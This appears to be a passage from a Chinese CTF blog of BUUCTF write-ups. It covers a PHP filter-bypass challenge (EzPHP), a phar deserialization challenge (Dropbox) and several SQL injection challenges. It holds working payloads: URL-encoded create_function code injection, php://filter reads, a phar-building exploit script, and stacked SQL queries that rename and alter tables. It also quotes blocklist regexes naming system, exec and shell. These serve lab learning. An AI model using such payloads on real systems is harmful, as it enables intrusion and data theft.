href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>这个题质量好高</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208211705547.png" alt="image-20211208211705547"></p><p>中间这个东西链接好像寄了，但是不影响做题，源码里有串base32，解码为1nD3x.php</p><p>访问这个页面</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208211820293.png" alt="image-20211208211820293"></p><pre class="language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);error_reporting(0); $file &#x3D; &quot;1nD3x.php&quot;;$shana &#x3D; $_GET[&#39;shana&#39;];$passwd &#x3D; $_GET[&#39;passwd&#39;];$arg &#x3D; &#39;&#39;;$code &#x3D; &#39;&#39;;echo &quot;&lt;br &#x2F;&gt;&lt;font color&#x3D;red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;&#x2F;B&gt;&lt;br&gt;&lt;&#x2F;font&gt;&quot;;if($_SERVER) &#123;     if (  preg_match(&#39;&#x2F;shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log&#x2F;i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])        )          die(&#39;You seem to want to do something bad?&#39;); &#125;if (!preg_match(&#39;&#x2F;http|https&#x2F;i&#39;, $_GET[&#39;file&#39;])) &#123;    if (preg_match(&#39;&#x2F;^aqua_is_cute$&#x2F;&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !&#x3D;&#x3D; &#39;aqua_is_cute&#39;) &#123;         $file &#x3D; $_GET[&quot;file&quot;];         echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;    &#125; &#125; else die(&#39;fxck you! What do you want to do ?!&#39;);if($_REQUEST) &#123;     foreach($_REQUEST as $value) &#123;         if(preg_match(&#39;&#x2F;[a-zA-Z]&#x2F;i&#39;, $value))              die(&#39;fxck you! I hate English!&#39;);     &#125; &#125; if (file_get_contents($file) !&#x3D;&#x3D; &#39;debu_debu_aqua&#39;)    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;);if ( sha1($shana) &#x3D;&#x3D;&#x3D; sha1($passwd) &amp;&amp; $shana !&#x3D; $passwd )&#123;    extract($_GET[&quot;flag&quot;]);    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123;    die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;);&#125;if(preg_match(&#39;&#x2F;^[a-z0-9]*$&#x2F;isD&#39;, $code) || preg_match(&#39;&#x2F;fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\&#96;|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\&#x3D;|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^&#x2F;i&#39;, $arg) ) &#123;     die(&quot;&lt;br &#x2F;&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag &#x3D;w&#x3D;&quot;); &#125; else &#123;     include &quot;flag.php&quot;;    $code(&#39;&#39;, $arg); &#125; ?&gt;</code></pre><p>过滤了一堆东西</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209223849475.png" alt="image-20211209223849475"></p><p>首先是这个，query_string获取的内容不会进行url解码，所以绕过这一步就只需要把传入的参数进行url编码就行</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224105760.png" alt="image-20211209224105760"></p><p>这里可以用换行符%0a绕过preg_match的匹配</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224139505.png" alt="image-20211209224139505"></p><p>这个由于检测的$_REQUEST，而对 $_REQUEST来说post的优先级大于get，所以要post传入和get内容相同的参数，把值改为数字就行</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224337739.png" alt="image-20211209224337739"></p><p>这个要用data://伪协议就行</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224412665.png" alt="image-20211209224412665"></p><p>常见的数组绕过</p><p>最后这也是最重要的地方</p><p>首先说一下<strong>create_function注入</strong></p><p><code>create_function()</code> 函数有两个参数 <code>$args</code> 和 <code>$code</code>，用于创建一个 lambda 样式的函数</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209225145733.png" alt="image-20211209225145733"></p><p>但是我们可以通过对b进行操作，来实现这个函数的提前闭合，并写入我们想要的命令，然后通过注释符使语句合理</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209225534763.png" alt="image-20211209225534763"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224450239.png" alt="image-20211209224450239"></p><p><code>$arg</code> 和 <code>$code</code> 变量都是可控的，因为 <code>extract()</code> 函数使用数组键名作为变量名，使用数组键值作为变量值，针对数组中的每个元素，将在当前符号表中创建对应的一个变量。因此只要 <code>extract()</code> 内的数组键名为 <code>arg</code> 和 <code>code</code>，键值为我们构造的用来注入的代码，即可实现 <code>$arg</code> 和 <code>$code</code> 的变量覆盖，导致代码注入。</p><p>再利用</p><pre class="language-none"><code class="language-none">var_dump(get_defined_vars())</code></pre><p>用来输出所有变量和值</p><pre class="language-none"><code class="language-none">&#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e解码内容：&#x2F;1nD3x.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,ZGVidV9kZWJ1X2FxdWE&#x3D;&amp;debu&#x3D;aqua_is_cute&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;&amp;flag[code]&#x3D;create_function</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209214827071.png" alt="image-20211209214827071"></p><p>但是看见flag在rea1fl4g里</p><p>所以要利用require包含这个文件然后再用get_defined_vars()读一遍试试</p><p>但是又过滤了.</p><p>所以试试base64编码</p><pre class="language-none"><code class="language-none">GET:&#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%72%65%71%75%69%72%65%28%62%61%73%65%36%34%5f%64%65%63%6f%64%65%28%63%6d%56%68%4d%57%5a%73%4e%47%63%75%63%47%68%77%29%29%3b%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6ePOST:file&#x3D;1&amp;debu&#x3D;1&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;1</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209215908383.png" alt="image-20211209215908383"></p><p>还是不行，尝试伪协议读源码了只能</p><p>require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)</p><p>采用取反绕过过滤</p><pre class="language-none"><code class="language-none">GET:&#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));&#x2F;&#x2F;&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&#x2F;&#x2F;这里不知道为什么把require也取反就没法用了POST:file&#x3D;1&amp;debu&#x3D;1&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;1&#x2F;&#x2F; preg_match() 只能匹配字符串，数组得以绕过。</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209232958132.png" alt="image-20211209232958132"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209221809797.png" alt="image-20211209221809797"></p><p><a href="https://blog.gem-love.com/ctf/770.html">2020BJDCTF “EzPHP” +Y1ngCTF “Y1ng’s Baby Code” 官方writeup – 颖奇L&#39;Amore (gem-love.com)</a></p><p>原题用异或也可以，贴个脚本先，万一以后能用到</p><pre class="language-none"><code class="language-none">#Author: piCEBDC7str_&#x3D; &#39;1flag.php&#39;str_&#x3D;list(str_)final&#x3D;&#39;&#39;for x in str_:    print(hex(~ord(x)&amp;0xff))    final+&#x3D;hex(~ord(x)&amp;0xff)print(str_)final &#x3D; final.replace(&#39;0x&#39;,&#39;%&#39;)final+&#x3D;&#39;^&#39;for x in range(len(str_)):    final+&#x3D;r&#39;%ff&#39;print(final)</code></pre><p>取反脚本</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?&#x2F;&#x2F;Author: 颖奇L&#39;Amore&#x2F;&#x2F;Blog: www.gem-love.com$a &#x3D; &quot;p h p : &#x2F; &#x2F; f i l t e r &#x2F; r e a d &#x3D; c o n v e r t . b a s e 6 4 - e n c o d e &#x2F; r e s o u r c e &#x3D; 1 f l a g . p h p&quot;;$arr1 &#x3D; explode(&#39; &#39;, $a);echo &quot;&lt;br&gt;~(&quot;;foreach ($arr1 as $key &#x3D;&gt; $value) &#123;echo &quot;%&quot;.bin2hex(~$value);&#125;echo &quot;)&lt;br&gt;&quot;;</code></pre><p>用羽师傅那个也行</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209235444083.png" alt="image-20211209235444083"></p><h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><p>知识点：phar的反序列化</p><p>传个jpg文件然后下载的时候抓包有个filename，这里可以实现任意文件读取</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211210213306758.png" alt="image-20211210213306758"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211210213358180.png" alt="image-20211210213358180"></p><p>index.php</p><pre class="language-none"><code class="language-none">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;?&gt;&lt;?phpinclude &quot;class.php&quot;;$a &#x3D; new FileList($_SESSION[&#39;sandbox&#39;]);$a-&gt;Name();$a-&gt;Size();?&gt;</code></pre><p>download.php</p><pre class="language-none"><code class="language-none">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;if (!isset($_POST[&#39;filename&#39;])) &#123;    die();&#125;include &quot;class.php&quot;;ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:&#x2F;etc:&#x2F;tmp&quot;);chdir($_SESSION[&#39;sandbox&#39;]);$file &#x3D; new File();$filename &#x3D; (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) &#x3D;&#x3D;&#x3D; false) &#123;    Header(&quot;Content-type: application&#x2F;octet-stream&quot;);    Header(&quot;Content-Disposition: attachment; filename&#x3D;&quot; . basename($filename));    echo $file-&gt;close();&#125; else &#123;    echo &quot;File not exist&quot;;&#125;?&gt;</code></pre><p>login.php</p><pre class="language-none"><code class="language-none">&lt;?phpsession_start();if (isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: index.php&quot;);    die();&#125;?&gt;&lt;?phpinclude &quot;class.php&quot;;if (isset($_GET[&#39;register&#39;])) &#123;    echo &quot;&lt;script&gt;toast(&#39;注册成功&#39;, &#39;info&#39;);&lt;&#x2F;script&gt;&quot;;&#125;if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123;    $u &#x3D; new User();    $username &#x3D; (string) $_POST[&quot;username&quot;];    $password &#x3D; (string) $_POST[&quot;password&quot;];    if (strlen($username) &lt; 20 &amp;&amp; $u-&gt;verify_user($username, $password)) &#123;        $_SESSION[&#39;login&#39;] &#x3D; true;        $_SESSION[&#39;username&#39;] &#x3D; htmlentities($username);        $sandbox &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SESSION[&#39;username&#39;] . &quot;sftUahRiTz&quot;) . &quot;&#x2F;&quot;;        if (!is_dir($sandbox)) &#123;            mkdir($sandbox);        &#125;        $_SESSION[&#39;sandbox&#39;] &#x3D; $sandbox;        echo(&quot;&lt;script&gt;window.location.href&#x3D;&#39;index.php&#39;;&lt;&#x2F;script&gt;&quot;);        die();    &#125;    echo &quot;&lt;script&gt;toast(&#39;账号或密码错误&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;&#125;?&gt;</code></pre><p>class.php</p><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);$dbaddr &#x3D; &quot;127.0.0.1&quot;;$dbuser &#x3D; &quot;root&quot;;$dbpass &#x3D; &quot;root&quot;;$dbname &#x3D; &quot;dropbox&quot;;$db &#x3D; new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User &#123;    public $db;    public function __construct() &#123;        global $db;        $this-&gt;db &#x3D; $db;    &#125;    public function user_exist($username) &#123;        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;username&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ? LIMIT 1;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;store_result();        $count &#x3D; $stmt-&gt;num_rows;        if ($count &#x3D;&#x3D;&#x3D; 0) &#123;            return false;        &#125;        return true;    &#125;    public function add_user($username, $password) &#123;        if ($this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;INSERT INTO &#96;users&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;) VALUES (NULL, ?, ?);&quot;);        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);        $stmt-&gt;execute();        return true;    &#125;    public function verify_user($username, $password) &#123;        if (!$this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;password&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ?;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;bind_result($expect);        $stmt-&gt;fetch();        if (isset($expect) &amp;&amp; $expect &#x3D;&#x3D;&#x3D; $password) &#123;            return true;        &#125;        return false;    &#125;    public function __destruct() &#123;        $this-&gt;db-&gt;close();    &#125;&#125;class FileList &#123;    private $files;    private $results;    private $funcs;    public function __construct($path) &#123;        $this-&gt;files &#x3D; array();        $this-&gt;results &#x3D; array();        $this-&gt;funcs &#x3D; array();        $filenames &#x3D; scandir($path);        $key &#x3D; array_search(&quot;.&quot;, $filenames);        unset($filenames[$key]);        $key &#x3D; array_search(&quot;..&quot;, $filenames);        unset($filenames[$key]);        foreach ($filenames as $filename) &#123;            $file &#x3D; new File();            $file-&gt;open($path . $filename);            array_push($this-&gt;files, $file);            $this-&gt;results[$file-&gt;name()] &#x3D; array();        &#125;    &#125;    public function __call($func, $args) &#123;        array_push($this-&gt;funcs, $func);        foreach ($this-&gt;files as $file) &#123;            $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func();        &#125;    &#125;    public function __destruct() &#123;        $table &#x3D; &#39;&lt;div id&#x3D;&quot;container&quot; class&#x3D;&quot;container&quot;&gt;&lt;div class&#x3D;&quot;table-responsive&quot;&gt;&lt;table id&#x3D;&quot;table&quot; class&#x3D;&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;        $table .&#x3D; &#39;&lt;thead&gt;&lt;tr&gt;&#39;;        foreach ($this-&gt;funcs as $func) &#123;            $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;&#x2F;th&gt;&#39;;        &#125;        $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;Opt&lt;&#x2F;th&gt;&#39;;        $table .&#x3D; &#39;&lt;&#x2F;thead&gt;&lt;tbody&gt;&#39;;        foreach ($this-&gt;results as $filename &#x3D;&gt; $result) &#123;            $table .&#x3D; &#39;&lt;tr&gt;&#39;;            foreach ($result as $func &#x3D;&gt; $value) &#123;                $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;&#x2F;td&gt;&#39;;            &#125;            $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot; filename&#x3D;&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;download&quot;&gt;下载&lt;&#x2F;a&gt; &#x2F; &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;delete&quot;&gt;删除&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&#39;;            $table .&#x3D; &#39;&lt;&#x2F;tr&gt;&#39;;        &#125;        echo $table;    &#125;&#125;class File &#123;    public $filename;    public function open($filename) &#123;        $this-&gt;filename &#x3D; $filename;        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;            return true;        &#125; else &#123;            return false;        &#125;    &#125;    public function name() &#123;        return basename($this-&gt;filename);    &#125;    public function size() &#123;        $size &#x3D; filesize($this-&gt;filename);        $units &#x3D; array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;);        for ($i &#x3D; 0; $size &gt;&#x3D; 1024 &amp;&amp; $i &lt; 4; $i++) $size &#x2F;&#x3D; 1024;        return round($size, 2).$units[$i];    &#125;    public function detele() &#123;        unlink($this-&gt;filename);    &#125;    public function close() &#123;        return file_get_contents($this-&gt;filename);    &#125;&#125;?&gt;</code></pre><p>delete.php</p><pre class="language-none"><code class="language-none">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;if (!isset($_POST[&#39;filename&#39;])) &#123;    die();&#125;include &quot;class.php&quot;;chdir($_SESSION[&#39;sandbox&#39;]);$file &#x3D; new File();$filename &#x3D; (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;    $file-&gt;detele();    Header(&quot;Content-type: application&#x2F;json&quot;);    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; true, &quot;error&quot; &#x3D;&gt; &quot;&quot;);    echo json_encode($response);&#125; else &#123;    Header(&quot;Content-type: application&#x2F;json&quot;);    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;File not exist&quot;);    echo json_encode($response);&#125;?&gt;</code></pre><p>phar反序列化利用条件：</p><p>1）phar文件要能够上传至服务器</p><p>2）要有可用的魔术方法为跳板</p><p>3）文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤</p><p>对于本题而言，第一条满足，第二条有一个魔术方法__call()和FileList类、User类的__destruct()，恐怕想不利用它们也不行，第三条后半部分没问题，前半部分则需要我们找一找。</p><p>既曰文件操作函数，就应该在本题的File类（至多也在FileList类）的方法中寻找，毕竟整个题目基本上都是在面向对象的基础上编程，对文件的操作也都是对File类的对象的操作，</p><p>我们看到，open()方法调用了file_exists()和is_dir()函数（注意name方法里的basename函数不算），size()方法调用了filesize()函数，delete()方法调用了unlink()函数，close()方法file_get_contents()函数。</p><p>我们前面提到了，本题要读取/flag.txt文件，故刚刚列举的这些函数中，虽然文件操作函数不少，可以用来触发反序列化，对读取文件有用的只有close()方法中的file_get_contents()函数这一个，所以我们可以对它分析，</p><p>这个时候，如果想不到__call()方法和__destruct()方法，基本上就可以放弃了，在phar题目里，魔术方法一般来讲是必须要用的，</p><p><img src="https://upload-images.jianshu.io/upload_images/18851076-8640cc264961f33a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/799/format/webp" alt="img"></p><p>这里我们看到，FileList的__call()方法语义简单，就是遍历files数组，对每一个file变量执行一次$func，然后将结果存进$results数组，</p><p>接下来的__destruct函数会将FileList对象的funcs变量和results数组中的内容以HTML表格的形式输出在index.php上（我们可以看到，index.php里创建了一个FileList对象，在脚本执行完毕后触发__destruct，则会输出该用户目录下的文件信息），</p><p>User对象的__destruct()方法，</p><p><img src="https://upload-images.jianshu.io/upload_images/18851076-09b15043434b727a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/479/format/webp" alt="img"></p><p>无非就是 脚本执行完毕后，执行$db的close()的方法（来关闭数据库连接），但话说回来，没有括号里的话，这句话依然成立，而且这个&#39;close&#39;与File类中的close()方法同名。所以，当db的值为一个FileList对象时，User对象析构之时，会触发FileList-&gt;close()，但FileList里没有这个方法，于是调用_call函数，进而执行file_get_contents($filename)，读取了文件内容。整个链的结构也很简单清晰：在我们控制$db为一个FileList对象的情况下，$user-&gt;__destruct() =&gt; $db-&gt;close() =&gt; $db-&gt;__call(&#39;close&#39;) =&gt; $file-&gt;close() =&gt; $results=file_get_contents($filename) =&gt; FileList-&gt;__destruct()输出$result。</p><p>反序列化脚本</p><pre class="language-none"><code class="language-none">&lt;?php    class User &#123;        public $db;    &#125;     class File&#123;        public $filename;        public function __construct($name)&#123;            $this-&gt;filename&#x3D;$name;        &#125;    &#125;    class FileList &#123;        private $files;        public function __construct()&#123;            $this-&gt;files&#x3D;array(new File(&#39;&#x2F;flag.txt&#39;));        &#125;    &#125;     $o &#x3D; new User();    $o-&gt;db &#x3D;new FileList();    @unlink(&quot;phar.phar&quot;);    $phar &#x3D; new Phar(&quot;phar.phar&quot;);    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);    $phar-&gt;setMetadata($o);    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);     $phar-&gt;stopBuffering();?&gt;</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211210220146818.png" alt="image-20211210220146818"></p><p>参考文章</p><p>[<a href="https://www.jianshu.com/p/5b91e0b7f3ac">CISCN2019 华北赛区 Day1 Web1]Dropbox之愚见 - 简书 (jianshu.com)</a></p><p>[(24条消息) 关于phar反序列化——BUUCTF-<a href="https://blog.csdn.net/silence1_/article/details/102683254">CISCN2019 华北赛区 Day1 Web1]Dropbox_silence1_的博客-CSDN博客_buuctf 反序列化</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql题wp</title>
      <link href="/2021/06/16/buu-sql%E9%A2%98wp/"/>
      <url>/2021/06/16/buu-sql%E9%A2%98wp/</url>
      
        <content type="html"><![CDATA[<p> sql好难.jpg</p> <span id="more"></span><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210615120304661.png" alt="image-20210615120304661"></p><p>用户框里输入单引号出现报错，猜测为字符型注入</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210615121140407.png" alt="image-20210615121140407"></p><p>利用1&#39;or 1#注入得到flag</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210615121210956.png" alt="image-20210615121210956"></p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>先试一下万能密码</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210615214551313.png" alt="image-20210615214551313"></p><p>利用1‘ order by 可以试出该表中存在两个字段</p><p>接下来要用堆叠查询（利用分号执行多个sql语句）</p><p>尝试先查询数据库</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210615214516623.png" alt="image-20210615214516623"></p><p>成功。</p><p>再查询表名</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210615214901418.png" alt="image-20210615214901418"></p><p>看到有两个表，查询两个表中的字段</p><p>words表内存在两个字段</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210615215132406.png" alt="image-20210615215132406"></p><p>1919810931114514表内存在一个字段，flag在该表内。</p><p>（查询该表时表名要在反单引号内）</p><p>1&#39;;show columns from <code>1919810931114514</code>#</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210615215232514.png" alt="image-20210615215232514"></p><p>所以可以猜测</p><p>内部查询语句类似 : select id, data from words where id =</p><p>所以要把words表改为word1，将flag所在的表表名改为words，然后将flag改名为id；</p><p>payload：1&#39;;rename table words to word1;rename table <code>1919810931114514</code> to words; alert table words change flag id varchar(100);# </p><p>再用1’ or 1#注入</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210615232041458.png" alt="image-20210615232041458"></p><p>也可以把words表改为words，将flag所在的表表名改为words，再为其添加id列，并将flag改为data</p><p>payload：1&#39;;rename table words to word1;rename table <code>1919810931114514</code> to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);# </p><p>再将1提交可直接获得flag</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210615232008605.png" alt="image-20210615232008605"></p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>进入后输入1有回显</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210617020541195.png" alt="image-20210617020541195"></p><p>输入1‘无回显猜测是数字型注入</p><p>用堆叠注入的方式</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210617020708317.png" alt="image-20210617020708317"></p><p>查到存在一个flag表，尝试查看里面的内容</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210617020823449.png" alt="image-20210617020823449"></p><p>大概是被过滤了，只好百度搜wp了</p><p>看到dalao能够猜出后端语句为select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag</p><p>（搜到一篇wp说原环境中存在源码泄露，所以能够知道这部分的sql语言，但是buu的环境里没有[BUUCTF <a href="https://blog.csdn.net/weixin_44037296/article/details/105190639?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param">SUCTF 2019] EasySQL_Senimo-CSDN博客</a>）</p><p><strong>解法一</strong>：输入*,1</p><p>由于||在MySQL中起或的作用，因此1||flag会返回1，也就变成了</p><p>select *,1 from Flag.</p><p>成功找到flag</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210617021123869.png" 